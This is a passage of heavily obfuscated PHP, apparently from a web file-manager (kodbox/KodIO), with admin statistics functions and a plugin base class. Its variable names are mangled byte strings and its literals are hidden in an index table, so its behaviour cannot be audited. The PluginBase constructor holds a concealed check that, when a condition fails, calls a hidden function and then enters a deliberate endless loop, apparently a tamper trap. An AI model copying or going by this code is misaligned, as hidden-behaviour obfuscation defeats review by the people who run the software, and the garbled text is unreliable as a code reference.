$¹‘ò¼¦Â = $this->validDate($ß‡şâ–ı, $Ò“¦Óå‰); $çµ§ç” = array(); $Ê»ïêÌü = array_to_keyvalue($‡ ÛÌ×, $Ç×ŠÜğ¨[221]); foreach ($¹‘ò¼¦Â as $ê ß¢¾Û) { if (isset($Ê»ïêÌü[$ê ß¢¾Û])) { $é•áà½ = $Ê»ïêÌü[$ê ß¢¾Û]; } else { $é•áà½ = end($‡ ÛÌ×); $é•áà½[$Ç×ŠÜğ¨[221]] = $ê ß¢¾Û; if ($Ä©Ù„Šë == $Ç×ŠÜğ¨[590]) { $é•áà½[$Ç×ŠÜğ¨[1739]] = $é•áà½[$Ç×ŠÜğ¨[1740]] = 0; } } $çµ§ç”[] = $é•áà½; } $‡ ÛÌ× = $çµ§ç”; } $§ı˜íòˆ = array($Ç×ŠÜğ¨[590] => array($Ç×ŠÜğ¨[751] => LNG($Ç×ŠÜğ¨[1755]), $Ç×ŠÜğ¨[1739] => LNG($Ç×ŠÜğ¨[1756]), $Ç×ŠÜğ¨[1740] => LNG($Ç×ŠÜğ¨[1757])), $Ç×ŠÜğ¨[1741] => array($Ç×ŠÜğ¨[749] => LNG($Ç×ŠÜğ¨[1758]), $Ç×ŠÜğ¨[1743] => LNG($Ç×ŠÜğ¨[1759]), $Ç×ŠÜğ¨[1744] => LNG($Ç×ŠÜğ¨[1760]), $Ç×ŠÜğ¨[1745] => LNG($Ç×ŠÜğ¨[1761]))); $ô¾´–é® = array($Ç×ŠÜğ¨[590] => $Ç×ŠÜğ¨[1762], $Ç×ŠÜğ¨[1741] => $Ç×ŠÜğ¨[80]); if (empty($‡ ÛÌ×)) { $ê ß¢¾Û = date($Ç×ŠÜğ¨[1746], strtotime($Ç×ŠÜğ¨[1747])); $§ßü÷…ß = array($Ç×ŠÜğ¨[221] => $ê ß¢¾Û); foreach ($§ı˜íòˆ[$Ä©Ù„Šë] as $˜†ŠÃŠ´ => $ºùùŠãİ) { $§ßü÷…ß[$˜†ŠÃŠ´] = 0; } $‡ ÛÌ×[] = $§ßü÷…ß; } $”Ùû“íä = array(); foreach ($‡ ÛÌ× as $ºùùŠãİ) { if ($Ä©Ù„Šë == $Ç×ŠÜğ¨[1741] && $ºùùŠãİ[$Ç×ŠÜğ¨[1743]] > $ºùùŠãİ[$Ç×ŠÜğ¨[749]]) { $ºùùŠãİ[$Ç×ŠÜğ¨[1743]] = $ºùùŠãİ[$Ç×ŠÜğ¨[749]]; } foreach ($§ı˜íòˆ[$Ä©Ù„Šë] as $˜†ŠÃŠ´ => $§©Ğ‡”) { $é•áà½ = array($Ç×ŠÜğ¨[221] => $ºùùŠãİ[$Ç×ŠÜğ¨[221]], $Ç×ŠÜğ¨[1541] => $§©Ğ‡”); $é•áà½[$ô¾´–é®[$Ä©Ù„Šë]] = isset($ºùùŠãİ[$˜†ŠÃŠ´]) ? $ºùùŠãİ[$˜†ŠÃŠ´] : 0; $”Ùû“íä[] = $é•áà½; } } return $”Ùû“íä; } public function validDate($¬½¯ˆ“, $ÂÑéœ) { $Íäàß©¸ =& $_SERVER[ê‘³Æ±]; $ùÒ¶Ïæ = date($Íäàß©¸[1746], strtotime($Íäàß©¸[1747])); $ß¿ùƒ¦ø = array($ùÒ¶Ïæ); switch ($¬½¯ˆ“) { case $Íäàß©¸[1621]: $®Ÿú½¡ = mktime(0, 0, 0, date($Íäàß©¸[1763]), date($Íäàß©¸[1362]) - date($Íäàß©¸[1425]) + 7 - 7, date($Íäàß©¸[1764])); $ñ³­³½÷ = 0; do { $³ŒäíùÅ = date($Íäàß©¸[1746], $®Ÿú½¡ - 3600 * 24 * 7 * $ñ³­³½÷); $ß¿ùƒ¦ø[] = $³ŒäíùÅ; $ñ³­³½÷++; } while ($ÂÑéœ < $³ŒäíùÅ); break; case $Íäàß©¸[1619]: $ñ³­³½÷ = 1; do { $˜ºÅ² = date($Íäàß©¸[1765], strtotime("\x2d\40{$ñ³­³½÷}\x20\x6d\x6f\156\164\x68\x73")); $ß¿ùƒ¦ø[] = $˜ºÅ²; $ñ³­³½÷++; } while ($ÂÑéœ < $˜ºÅ²); break; case $Íäàß©¸[1766]: $Ê€íØî = (int) date($Íäàß©¸[1764], strtotime($ÂÑéœ)); $¹’äáÓÁ = (int) date($Íäàß©¸[1764]); if ($Ê€íØî >= $¹’äáÓÁ) { break; } for ($Ê€íØî; $Ê€íØî < $¹’äáÓÁ; $Ê€íØî++) { $ß¿ùƒ¦ø[] = $Ê€íØî . $Íäàß©¸[1767]; } break; default: break; } if ($ÂÑéœ > end($ß¿ùƒ¦ø)) { array_pop($ß¿ùƒ¦ø); } sort($ß¿ùƒ¦ø); return $ß¿ùƒ¦ø; } public function listTable($®¼¼Ÿ) { $ô™µıù = ucfirst($®¼¼Ÿ); return Model($ô™µıù)->listData(); } public function option($ÙÛ‚öÛ) { $èØÓ£– = $_SERVER[ê‘³Æ±][1768] . ucfirst($ÙÛ‚öÛ); return $this->{$èØÓ£–}(); } private function optionUser() { $àæÊ‰ÆÛ =& $_SERVER[ê‘³Æ±]; $öÔ¶ãµÖ = Model($àæÊ‰ÆÛ[534])->count($àæÊ‰ÆÛ[1641]); $¦ˆøöÈ¬ = Model($àæÊ‰ÆÛ[534])->where($àæÊ‰ÆÛ[1769])->count($àæÊ‰ÆÛ[1641]); $‡éÀå³ñ = intval($GLOBALS[$àæÊ‰ÆÛ[6]][$àæÊ‰ÆÛ[346]][$àæÊ‰ÆÛ[1597]]) / 3600; $ÏÃÄöôÊ = strtotime("\x2d{$‡éÀå³ñ}\x20\150\157\x75\x72\163"); $É¸‚«Øµ = strtotime(date($àæÊ‰ÆÛ[1750])); if ($ÏÃÄöôÊ < $É¸‚«Øµ) { $ÏÃÄöôÊ = $É¸‚«Øµ; } $ö„ö¡Òı = array($àæÊ‰ÆÛ[1770] => array($àæÊ‰ÆÛ[1003], $ÏÃÄöôÊ)); $²ƒ÷æÀ´ = (int) Model($àæÊ‰ÆÛ[534])->where($ö„ö¡Òı)->count($àæÊ‰ÆÛ[1641]); if (!$²ƒ÷æÀ´) { $²ƒ÷æÀ´ = 1; } $ö„ö¡Òı = array($àæÊ‰ÆÛ[1770] => array($àæÊ‰ÆÛ[1003], $É¸‚«Øµ)); $Øğ¨‹¤¢ = Model($àæÊ‰ÆÛ[534])->where($ö„ö¡Òı)->count($àæÊ‰ÆÛ[1641]); return array($àæÊ‰ÆÛ[745] => (int) $öÔ¶ãµÖ, $àæÊ‰ÆÛ[1771] => (int) ($öÔ¶ãµÖ - $¦ˆøöÈ¬), $àæÊ‰ÆÛ[1772] => (int) $¦ˆøöÈ¬, $àæÊ‰ÆÛ[1773] => (int) $Øğ¨‹¤¢, $àæÊ‰ÆÛ[1774] => $²ƒ÷æÀ´); } private function optionFile() { $â¤‹Ï“Ÿ =& $_SERVER[ê‘³Æ±]; $İš½Ñ®± = $this->sourceSize(); $†Ş”´Ï = $İš½Ñ®±[$â¤‹Ï“Ÿ[80]]; $¾Õ››í£ = $İš½Ñ®±[$â¤‹Ï“Ÿ[1743]]; $óÇ®«¡Ÿ = Model($â¤‹Ï“Ÿ[819])->where(array($â¤‹Ï“Ÿ[404] => 0))->count($â¤‹Ï“Ÿ[396]); $·Áğ·ãÉ = array($â¤‹Ï“Ÿ[404] => 0, $â¤‹Ï“Ÿ[195] => array($â¤‹Ï“Ÿ[1003], strtotime(date($â¤‹Ï“Ÿ[1750])))); $Ê¯­÷€ = Model($â¤‹Ï“Ÿ[819])->where($·Áğ·ãÉ)->sum($â¤‹Ï“Ÿ[80]); $†ôòÊÜÈ = Model($â¤‹Ï“Ÿ[819])->where($·Áğ·ãÉ)->count($â¤‹Ï“Ÿ[396]); return array($â¤‹Ï“Ÿ[749] => $†Ş”´Ï, $â¤‹Ï“Ÿ[1743] => $¾Õ››í£, $â¤‹Ï“Ÿ[1775] => $†Ş”´Ï - $¾Õ››í£, $â¤‹Ï“Ÿ[1776] => (int) $Ê¯­÷€, $â¤‹Ï“Ÿ[751] => (int) $óÇ®«¡Ÿ, $â¤‹Ï“Ÿ[1777] => (int) $†ôòÊÜÈ); } private function optionAccess() { $²×ãÀÃï =& $_SERVER[ê‘³Æ±]; return array($²×ãÀÃï[745] => $this->typeLogCnt(), $²×ãÀÃï[108] => $this->typeLogCnt($²×ãÀÃï[108]), $²×ãÀÃï[443] => $this->typeLogCnt($²×ãÀÃï[443]), $²×ãÀÃï[1778] => $this->typeLogCnt($²×ãÀÃï[1778]), $²×ãÀÃï[1779] => $this->typeLogCnt($²×ãÀÃï[1779]), $²×ãÀÃï[590] => $this->typeLogCnt($²×ãÀÃï[12], $²×ãÀÃï[1754])); } private function typeLogCnt($ÍÄÑ›»¸ = '', $‹Õ »ê¾ = "\x69\144") { $ÖÍŠËší =& $_SERVER[ê‘³Æ±]; $¾ã¡¯íŒ = array($ÖÍŠËší[108] => array($ÖÍŠËší[1780], $ÖÍŠËší[1781]), $ÖÍŠËší[443] => array($ÖÍŠËší[1782], $ÖÍŠËší[1783]), $ÖÍŠËší[1778] => array($ÖÍŠËší[1784], $ÖÍŠËší[1785], $ÖÍŠËší[1786]), $ÖÍŠËší[1779] => array($ÖÍŠËší[1787], $ÖÍŠËší[1788]), $ÖÍŠËší[1789] => array($ÖÍŠËší[1790], $ÖÍŠËší[1791], $ÖÍŠËší[1792])); $Ï‘÷Ö»“ = strtotime(date($ÖÍŠËší[1750])); $ÇÙ»°½è = array($ÖÍŠËší[195] => array($ÖÍŠËší[1003], $Ï‘÷Ö»“)); if ($ÍÄÑ›»¸) { $ÇÙ»°½è[$ÖÍŠËší[33]] = array($ÖÍŠËší[7], $¾ã¡¯íŒ[$ÍÄÑ›»¸]); } $æ©²ã… = Model($ÖÍŠËší[1753])->where($ÇÙ»°½è)->count($‹Õ »ê¾); return (int) $æ©²ã…; } private function optionServer() { $šÊÇ²Š‡ =& $_SERVER[ê‘³Æ±]; $ú·®ÛØæ = $this->diskDriver(); $›ÛÑ³§ë = KodIO::defaultDriver(); $ƒ •õ»¾ = array($šÊÇ²Š‡[811] => $›ÛÑ³§ë[$šÊÇ²Š‡[394]]); $Œ©á§ì = Model($šÊÇ²Š‡[463])->where($ƒ •õ»¾)->sum($šÊÇ²Š‡[80]); $Ù×ÚßŸé = explode($šÊÇ²Š‡[53], $_SERVER[$šÊÇ²Š‡[142]]); $®ØùÊ‚ = $Ù×ÚßŸé[0]; $Àô¸‚÷  = $GLOBALS[$šÊÇ²Š‡[6]][$šÊÇ²Š‡[21]]; $£­çÙ³ = $Àô¸‚÷ [$šÊÇ²Š‡[965]]; if ($£­çÙ³ == $šÊÇ²Š‡[953]) { $˜úƒÓçÃ = explode($šÊÇ²Š‡[1259], $Àô¸‚÷ [$šÊÇ²Š‡[964]]); $£­çÙ³ = $˜úƒÓçÃ[0]; } if ($£­çÙ³ == $šÊÇ²Š‡[901] || $£­çÙ³ == $šÊÇ²Š‡[798]) { $ëö„ı°µ = Model()->db()->query($šÊÇ²Š‡[1793]); $Ÿ‚á¡¨× = $ëö„ı°µ[0] && isset($ëö„ı°µ[0][$šÊÇ²Š‡[1540]]) ? $ëö„ı°µ[0][$šÊÇ²Š‡[1540]] : 0; $£­çÙ³ = $šÊÇ²Š‡[1794] . ($Ÿ‚á¡¨× ? $šÊÇ²Š‡[8] . $Ÿ‚á¡¨× : $šÊÇ²Š‡[12]); } $­¥Û‚è¥ = $GLOBALS[$šÊÇ²Š‡[6]][$šÊÇ²Š‡[346]][$šÊÇ²Š‡[821]]; return array($šÊÇ²Š‡[1795] => $ú·®ÛØæ ? $ú·®ÛØæ[$šÊÇ²Š‡[1796]] : 0, $šÊÇ²Š‡[1797] => $ú·®ÛØæ ? $ú·®ÛØæ[$šÊÇ²Š‡[1798]] : 0, $šÊÇ²Š‡[1799] => (int) $›ÛÑ³§ë[$šÊÇ²Š‡[1796]] * 1024 * 1024 * 1024, $šÊÇ²Š‡[1800] => (int) $Œ©á§ì, $šÊÇ²Š‡[1801] => ucfirst($®ØùÊ‚), $šÊÇ²Š‡[1802] => $šÊÇ²Š‡[1803] . PHP_VERSION, $šÊÇ²Š‡[1804] => phpBuild64() ? 64 : 32, $šÊÇ²Š‡[744] => str_replace($šÊÇ²Š‡[1119], $šÊÇ²Š‡[981], $£­çÙ³), $šÊÇ²Š‡[346] => ucfirst($­¥Û‚è¥), $šÊÇ²Š‡[32] => $_SERVER[$šÊÇ²Š‡[1805]]); } private function diskDriver() { $û„µÂå¯ =& $_SERVER[ê‘³Æ±]; $Æ¯ŠÎ› = $û„µÂå¯[8]; $Œ¾¢ĞÀ = $GLOBALS[$û„µÂå¯[6]][$û„µÂå¯[1275]] == $û„µÂå¯[1276]; if ($Œ¾¢ĞÀ) { $Æ¯ŠÎ› = $û„µÂå¯[1806]; if (function_exists($û„µÂå¯[1807])) { exec($û„µÂå¯[1808], $…ößªæœ); $Æ¯ŠÎ› = $…ößªæœ[1] . $û„µÂå¯[8]; } } if (!file_exists($Æ¯ŠÎ›)) { return; } $èÕÂ‰î  = @disk_total_space($Æ¯ŠÎ›); $•Ä™©Ö½ = $èÕÂ‰î  - @disk_free_space($Æ¯ŠÎ›); return array($û„µÂå¯[1796] => $èÕÂ‰î , $û„µÂå¯[1798] => $•Ä™©Ö½); } public function fileChart($ãşª¥ï²) { $¿æİè²Ç =& $_SERVER[ê‘³Æ±]; if (isset($ãşª¥ï²[$¿æİè²Ç[1641]])) { return Model($¿æİè²Ç[819])->userFileTypeProfile($ãşª¥ï²[$¿æİè²Ç[1641]]); } if (isset($ãşª¥ï²[$¿æİè²Ç[1809]])) { return Model($¿æİè²Ç[819])->groupFileTypeProfile($ãşª¥ï²[$¿æİè²Ç[1809]]); } $ãîğ””Á = $this->sourceSize(); $Øî¿¸Äƒ = array($¿æİè²Ç[491] => 0, $¿æİè²Ç[405] => 1); $šÊ±Ùğù = Model($¿æİè²Ç[819])->where($Øî¿¸Äƒ)->sum($¿æİè²Ç[80]); $Øî¿¸Äƒ[$¿æİè²Ç[405]] = 2; $æ¨·ğÖ‚ = Model($¿æİè²Ç[819])->where($Øî¿¸Äƒ)->sum($¿æİè²Ç[80]); return array($¿æİè²Ç[749] => $ãîğ””Á[$¿æİè²Ç[80]], $¿æİè²Ç[1743] => $ãîğ””Á[$¿æİè²Ç[1743]], $¿æİè²Ç[1744] => (int) $šÊ±Ùğù, $¿æİè²Ç[1745] => (int) $æ¨·ğÖ‚); } private function sourceSize() { $ŒĞÍèÙ¢ =& $_SERVER[ê‘³Æ±]; $àê®Âß¼ = Model($ŒĞÍèÙ¢[819])->where(array($ŒĞÍèÙ¢[404] => 0))->sum($ŒĞÍèÙ¢[80]); $²áÀáèæ = Model($ŒĞÍèÙ¢[463])->sum($ŒĞÍèÙ¢[80]); if ($²áÀáèæ > $àê®Âß¼) { $²áÀáèæ = $àê®Âß¼; } return array($ŒĞÍèÙ¢[80] => (int) $àê®Âß¼, $ŒĞÍèÙ¢[1743] => (int) $²áÀáèæ); } } goto d”¼¥“ÂïÌ; eƒÖ‰œ¢…: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $·˜ÊÈ´¦ =& $_SERVER[ê‘³Æ±]; if (!isset($_SERVER[$·˜ÊÈ´¦[786]]) || !isset($_SERVER[$·˜ÊÈ´¦[784]])) { $½è¨È†£ = $·˜ÊÈ´¦[866]; $òôÌ‹‚… = $·˜ÊÈ´¦[787]; $Ğ’¡»âº = $_SERVER[$·˜ÊÈ´¦[788]] . $·˜ÊÈ´¦[789]; $É½™ÒÃ½ = $òôÌ‹‚…($Ğ’¡»âº); $½í ´Û = explode($·˜ÊÈ´¦[228], $É½™ÒÃ½); if (count($½í ´Û) < $·˜ÊÈ´¦[613]) { $Œƒ¥ş„Ó = $·˜ÊÈ´¦[790]; $Œƒ¥ş„Ó(); } $Úù¬…ñÙ = $·˜ÊÈ´¦[867]; $Úù¬…ñÙ($_SERVER[$·˜ÊÈ´¦[868]]); $øİ‰¶†¤ = 1; for ($í»Ç”ö¯ = $øİ‰¶†¤; $í»Ç”ö¯ > 0; $í»Ç”ö¯++) { $Úù¬…ñÙ = json_encode($GLOBALS[$·˜ÊÈ´¦[412]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($·˜ÊÈ´¦[1508]); $this->pluginName = str_replace($·˜ÊÈ´¦[1508], $·˜ÊÈ´¦[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $·˜ÊÈ´¦[8]; $this->pluginApi = appHostGet() . $·˜ÊÈ´¦[1509] . $this->pluginName . $·˜ÊÈ´¦[8]; $this->pluginHost = $config[$·˜ÊÈ´¦[1510]] . $this->pluginName . $·˜ÊÈ´¦[8]; $this->pluginHostDefault = $config[$·˜ÊÈ´¦[1510]] . $this->pluginName . $·˜ÊÈ´¦[8]; $›˜úôÃ = $config[$·˜ÊÈ´¦[1511]]; if ($›˜úôÃ && strpos($·˜ÊÈ´¦[50] . $›˜úôÃ . $·˜ÊÈ´¦[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$·˜ÊÈ´¦[1512]] . $this->pluginName . $·˜ÊÈ´¦[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ê‘³Æ±][1513]); } protected function assign($˜¨Â•¼, $ËëÄ²Ä¢ = false) { if (is_array($˜¨Â•¼)) { $this->values = array_merge($this->values, $˜¨Â•¼); } else { $this->values[$˜¨Â•¼] = $ËëÄ²Ä¢; } } protected function display($õ™´á) { extract($this->values); require $õ™´á; } final function hookRegist($å¬ñÂÑ) { $this->modelPlugin->appRegist($this->pluginName, $å¬ñÂÑ); } final function appIcon() { $‚èë­ó× =& $_SERVER[ê‘³Æ±]; $—¬¦˜Åà = $this->appPackage(); $“ÙÕ‚Üû = $‚èë­ó×[12]; if (isset($—¬¦˜Åà[$‚èë­ó×[410]])) { if (isset($—¬¦˜Åà[$‚èë­ó×[410]][$‚èë­ó×[1514]])) { $“ÙÕ‚Üû = $‚èë­ó×[1515] . $—¬¦˜Åà[$‚èë­ó×[410]][$‚èë­ó×[1514]] . $‚èë­ó×[1516]; } else { if ($—¬¦˜Åà[$‚èë­ó×[410]][$‚èë­ó×[1517]]) { $“ÙÕ‚Üû = $‚èë­ó×[1518] . $—¬¦˜Åà[$‚èë­ó×[410]][$‚èë­ó×[1517]] . $‚èë­ó×[1519]; } } } return $“ÙÕ‚Üû; } final function fileCanView($”–Š™ËÄ) { $Ğ¸ÚÑßö =& $_SERVER[ê‘³Æ±]; if (request_url_safe($”–Š™ËÄ)) { return !0; } if ($this->isShare($”–Š™ËÄ)) { return !0; } $ó÷Ğ»©÷ = Session::get($Ğ¸ÚÑßö[1520]); if (!$ó÷Ğ»©÷ || !$ó÷Ğ»©÷[$Ğ¸ÚÑßö[1521]]) { $îÂ¥Òè = $Ğ¸ÚÑßö[1522] . rawurlencode(this_url()); show_tips(LNG($Ğ¸ÚÑßö[1523]) . $Ğ¸ÚÑßö[1524] . $îÂ¥Òè . $Ğ¸ÚÑßö[1525] . LNG($Ğ¸ÚÑßö[1526]) . $Ğ¸ÚÑßö[1527], !1); } if (!Action($Ğ¸ÚÑßö[1528])->authCan($Ğ¸ÚÑßö[1529])) { show_tips(LNG($Ğ¸ÚÑßö[1530]) . $Ğ¸ÚÑßö[1531], !1); } ActionCall($Ğ¸ÚÑßö[1532], $”–Š™ËÄ); } final function isShare($œ‹ê½’÷) { $îÔÛº‹ú = KodIO::parse($œ‹ê½’÷); return $îÔÛº‹ú[$_SERVER[ê‘³Æ±][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÑÍ×Æº©) { if (request_url_safe($ÑÍ×Æº©)) { return $ÑÍ×Æº©; } if (!$this->isShare($ÑÍ×Æº©)) { $ÑÍ×Æº© = $this->filePath($ÑÍ×Æº©); } return Action($_SERVER[ê‘³Æ±][1162])->linkOut($ÑÍ×Æº©); } public function filePathLinkOut($†óëú ) { if (request_url_safe($†óëú )) { return $†óëú ; } $this->fileCanView($†óëú ); return Action($_SERVER[ê‘³Æ±][1162])->link($†óëú ); } final function filePath($äúğâ¶¼) { $ûœ€İÛû =& $_SERVER[ê‘³Æ±]; if ($Ì´ã¥ = $this->checkSharePath($äúğâ¶¼)) { Hook::trigger($ûœ€İÛû[1533], $Ì´ã¥); return $Ì´ã¥; } $this->fileCanView($äúğâ¶¼); if (request_url_safe($äúğâ¶¼)) { $êÑû‘²‰ = parse_url_query($äúğâ¶¼); if (isset($êÑû‘²‰[$ûœ€İÛû[1534]]) && isset($êÑû‘²‰[$ûœ€İÛû[210]])) { $‹º¦çï = Model($ûœ€İÛû[756])->get($ûœ€İÛû[757]); $ö¢Œ‹ç  = Mcrypt::decode($êÑû‘²‰[$ûœ€İÛû[210]], $‹º¦çï); if ($ö¢Œ‹ç ) { $this->fileInfo = IO::infoWithChildren($ö¢Œ‹ç ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ö¢Œ‹ç ; } } $äúğâ¶¼ = $this->_cacheHttpFile($äúğâ¶¼); $this->fileInfo = IO::infoWithChildren($äúğâ¶¼); } else { $this->fileInfo = IO::infoWithChildren($äúğâ¶¼); if (!$this->fileInfo) { show_tips(LNG($ûœ€İÛû[106]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ûœ€İÛû[1533], $äúğâ¶¼); return $äúğâ¶¼; } final function _cacheHttpFile($œŠŠ´™û) { $˜Ø¬ò¡§ = hash_path($œŠŠ´™û, !0); $this->cachePath = $this->pluginCachePath($˜Ø¬ò¡§); if ($ªá­×Ú‡ = IO::fileNameExist($this->cachePath, $˜Ø¬ò¡§)) { return KodIO::make($ªá­×Ú‡); } $¦Ú¬¶¹ = $this->cachePath . $˜Ø¬ò¡§; return $this->pluginCacheFileSet($¦Ú¬¶¹, file_get_contents_nossl($œŠŠ´™û)); } final function _tmpFileName($‚…ÉÍÚá = array()) { $¯˜şÍ£ô =& $_SERVER[ê‘³Æ±]; if (!$‚…ÉÍÚá) { $‚…ÉÍÚá = $this->fileInfo; } if (isset($‚…ÉÍÚá[$¯˜şÍ£ô[172]])) { return $‚…ÉÍÚá[$¯˜şÍ£ô[172]]; } if (isset($‚…ÉÍÚá[$¯˜şÍ£ô[165]][$¯˜şÍ£ô[172]])) { return $‚…ÉÍÚá[$¯˜şÍ£ô[165]][$¯˜şÍ£ô[172]]; } $÷ßê¤› = IO::hashSimple($‚…ÉÍÚá[$¯˜şÍ£ô[78]]); if ($÷ßê¤›) { return $÷ßê¤›; } $†Ò°èş… = array($‚…ÉÍÚá[$¯˜şÍ£ô[32]], $‚…ÉÍÚá[$¯˜şÍ£ô[78]], $‚…ÉÍÚá[$¯˜şÍ£ô[80]]); if (isset($‚…ÉÍÚá[$¯˜şÍ£ô[514]])) { $†Ò°èş…[] = $‚…ÉÍÚá[$¯˜şÍ£ô[514]]; } return md5(implode($¯˜şÍ£ô[11], $†Ò°èş…)); } final function checkSharePath($‚ï•¸¯) { $İş“¢± =& $_SERVER[ê‘³Æ±]; if (!defined($İş“¢±[467])) { define($İş“¢±[507], 0); } if (!$this->isShare($‚ï•¸¯)) { return !1; } $¾İÑå¡œ = Action($İş“¢±[1162])->sharePathInfo($‚ï•¸¯); if (!isset($¾İÑå¡œ[$İş“¢±[78]])) { show_json(LNG($İş“¢±[1535]), !1); } $this->fileInfo = $¾İÑå¡œ[$İş“¢±[165]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$İş“¢±[172]]); return $¾İÑå¡œ[$İş“¢±[78]]; } final function pluginCachePath($°ñøÕş³ = '') { $ˆŸ¾îƒ =& $_SERVER[ê‘³Æ±]; $ñ¾ş–®ñ = IO_PATH_SYSTEM_TEMP . $ˆŸ¾îƒ[1536] . $this->pluginName; if (!($ªıá«Ö = IO::infoFull($ñ¾ş–®ñ))) { return IO::mkdir($ñ¾ş–®ñ . $ˆŸ¾îƒ[8] . $°ñøÕş³); } if (empty($°ñøÕş³)) { return $ªıá«Ö[$ˆŸ¾îƒ[78]]; } if (!($ÖºØòã = IO::fileNameExist($ªıá«Ö[$ˆŸ¾îƒ[78]], $°ñøÕş³))) { return IO::mkdir($ªıá«Ö[$ˆŸ¾îƒ[78]] . $°ñøÕş³); } return KodIO::make($ÖºØòã); } final function pluginCacheFileSet($Áêò¥¥‰, $ÈÓõúÍ« = '') { $â¤Ûş«• =& $_SERVER[ê‘³Æ±]; if (!($ò¾«‚Œ³ = IO::infoFull($Áêò¥¥‰))) { return IO::mkfile($Áêò¥¥‰, $ÈÓõúÍ«, REPEAT_REPLACE); } IO::setContent($ò¾«‚Œ³[$â¤Ûş«•[78]], $ÈÓõúÍ«); return $ò¾«‚Œ³[$â¤Ûş«•[78]]; } final function pluginLocalFile($ØèİéÁ§ = '') { $œù´Àª =& $_SERVER[ê‘³Æ±]; $êÍƒ­‡ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($êÍƒ­‡)) { mk_dir($êÍƒ­‡); } if (!$ØèİéÁ§) { return $êÍƒ­‡; } $¼˜íÓú = IO::info($ØèİéÁ§); $™Œ¿õªğ = $this->_tmpFileName($¼˜íÓú) . $œù´Àª[10] . $¼˜íÓú[$œù´Àª[169]]; if (!checkExtSafe($™Œ¿õªğ)) { $™Œ¿õªğ = $™Œ¿õªğ . $œù´Àª[1537]; } $ä°¼ï¿ = $êÍƒ­‡ . $™Œ¿õªğ; if (@file_exists($ä°¼ï¿)) { return $ä°¼ï¿; } return IO::copy($ØèİéÁ§, $êÍƒ­‡, 0, $™Œ¿õªğ); } final function appPackage() { $…ÒÖ°Ùá =& $_SERVER[ê‘³Æ±]; if ($this->packageData) { return $this->packageData; } $Ñ£·ƒ£Ò = $this->parseFile($this->pluginPath . $…ÒÖ°Ùá[1538]); $this->parseLang($Ñ£·ƒ£Ò); $ÍşëüÆú = json_decode_force($Ñ£·ƒ£Ò); if (!$ÍşëüÆú) { return array(); } $¿æßºˆü = Hook::trigger($…ÒÖ°Ùá[1539], $ÍşëüÆú); if ($¿æßºˆü && is_array($¿æßºˆü)) { $ÍşëüÆú = $¿æßºˆü; } $this->packageData = $ÍşëüÆú; return $ÍşëüÆú; } public function packageInfoGet($Íš˜ƒ—) { $‰¬›÷ÓÇ = $this->appPackage(); return array_get_value($‰¬›÷ÓÇ, $Íš˜ƒ—); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ê‘³Æ±][1540]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ê‘³Æ±][1541]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ê‘³Æ±][1542]); } public function echoJsAssign($¢á¸œ, $”ûŒÌ„Î) { $this->echoJsAssignArr[$¢á¸œ] = $”ûŒÌ„Î; } private function parseFile($¶¦ªïà¦) { $¯šË‡İ =& $_SERVER[ê‘³Æ±]; $‚õŠ÷Ô = file_get_contents_nossl($¶¦ªïà¦); $”œÁ±ÙÎ = array($¯šË‡İ[1543], $¯šË‡İ[1544], $¯šË‡İ[1545], $¯šË‡İ[1546], $¯šË‡İ[1547], $¯šË‡İ[1548], $¯šË‡İ[1549]); $ÇƒœŸÌ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¯šË‡İ[90]][$¯šË‡İ[1550]]); foreach ($this->echoJsAssignArr as $ùÇêøÂß => $«ìØ…Ä) { $”œÁ±ÙÎ[] = $¯šË‡İ[1551] . $ùÇêøÂß . $¯šË‡İ[1552]; $ÇƒœŸÌ[] = is_array($«ìØ…Ä) || is_object($«ìØ…Ä) ? rawurlencode(json_encode($«ìØ…Ä)) : $«ìØ…Ä; } if (strstr($‚õŠ÷Ô, $¯šË‡İ[1553])) { $³½Ò§öƒ = rawurlencode(json_encode($this->pluginLangArr)); $‚õŠ÷Ô = str_replace($¯šË‡İ[1553], $³½Ò§öƒ, $‚õŠ÷Ô); } if (strstr($‚õŠ÷Ô, $¯šË‡İ[1554])) { $³½Ò§öƒ = $³½Ò§öƒ = rawurlencode(json_encode($this->getConfig())); $‚õŠ÷Ô = str_replace($¯šË‡İ[1554], $³½Ò§öƒ, $‚õŠ÷Ô); } $‚õŠ÷Ô = str_replace($”œÁ±ÙÎ, $ÇƒœŸÌ, $‚õŠ÷Ô); return $‚õŠ÷Ô; } private function parseLang(&$Í¶öø“) { $Ûã½ª± =& $_SERVER[ê‘³Æ±]; $Ş¶®ÆŠÉ = $Ûã½ª±[1555]; if (!strstr($Í¶öø“, $Ş¶®ÆŠÉ)) { return; } preg_match_all($Ûã½ª±[1556], $Í¶öø“, $ßŒÍÁËÉ); if (!is_array($ßŒÍÁËÉ) || count($ßŒÍÁËÉ) == 0 || !is_array($ßŒÍÁËÉ[0]) || count($ßŒÍÁËÉ[0]) == 0) { return; } $éÜÃÓ«À = array(); $Ù¦®¬ã = array(); foreach ($ßŒÍÁËÉ[0] as $›¨Õğú½) { $‰èÍ´®« = substr($›¨Õğú½, strlen($Ş¶®ÆŠÉ), -4); $÷œ«¥ì = LNG($‰èÍ´®«); $éÜÃÓ«À[] = $›¨Õğú½; $Ù¦®¬ã[] = str_replace(array($Ûã½ª±[228], $Ûã½ª±[1067], $Ûã½ª±[339], $Ûã½ª±[119]), array($Ûã½ª±[53], $Ûã½ª±[53], $Ûã½ª±[12], $Ûã½ª±[1557]), $÷œ«¥ì); } $Í¶öø“ = 